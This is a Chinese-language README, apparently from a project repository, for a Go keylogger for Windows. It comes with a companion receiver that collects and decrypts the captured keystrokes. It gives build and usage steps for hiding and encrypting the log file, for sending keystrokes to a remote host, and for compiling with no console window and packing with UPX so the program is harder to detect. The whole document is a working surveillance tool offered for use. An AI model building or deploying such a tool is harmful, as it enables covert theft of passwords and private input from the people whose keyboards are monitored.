### listener
键盘监听程序

#### 参数配置
##### 1. 编译后，以命令行参数的方式进行传入
```
$ keylistener.exe -h
    -E
       encode text (default false)
    -H
       hidden file (default false)
    -lh string
       listener host
    -o string
       output to file (default "c:\\sys\\key.txt")
```

参数：

* -E : 进行文本加密
* -H : 隐藏记录文件
* -lh: 远程接收主机地址
* -o: 本地暂存文件的路径

示例：
进行文本加密， 隐藏记录文件，并把记录发送到， 192.168.1.148:8080
```
$ keylistener.exe -E -H -lh 192.168.1.148:8080
```

##### 2. 设置默认参数，无需手动输入, 编译后直接启动程序可以使用
自行修改listener/main.go下面这几行代码代码

```
// 默认配置
const (
	defaultPath     = "c:\\sys\\key.txt"     // 默认文件保存路径
	defaultHost     = "192.168.252.130:8080" // 默认远程接收地址
	defaultIsEncode = true                   // 默认进行文本加密
	defaultIsHidden = true                   // 默认进行文件隐藏
)
```

#### 编译

##### 1. 进入程序目录
```
$ cd keyboard/listener
```

##### 2. 编译程序
```
$ go build -ldflags "-s -w -H windowsgui" -o keylistener.exe *.go
```

##### 3. 可选，使用upx压缩程序（据说能起到一定加壳作用）
```
$ upx -9 keylistener.exe
```

### handler
记录接收的远程端，也可以用于解密加密过的键盘记录文件

##### 1. 进入程序目录
```
$ cd keyboard/handler
```

##### 2. 编译程序
```
$ go build -o keyhandler.exe *.go
```

##### 3. 参数
```
  -D    decode text
  -df string
        decode file
  -o string
        output to file
  -p string
        port
```
* -D: 是否需要解密，如果发送端进行加密，可使用此参数进行解密
* -df: 解密文件，后面接文件路径
* -o: 输出文件路径
* -p: 服务端端口地址

示例：

1. 监听8080端口,并对记录进行解密
```
$ keyhandler.exe -D -p 0.0.0.0:8080
```

2. 解密加密文件
```
$ keyhandler.exe -df key.txt -o log.txt
```

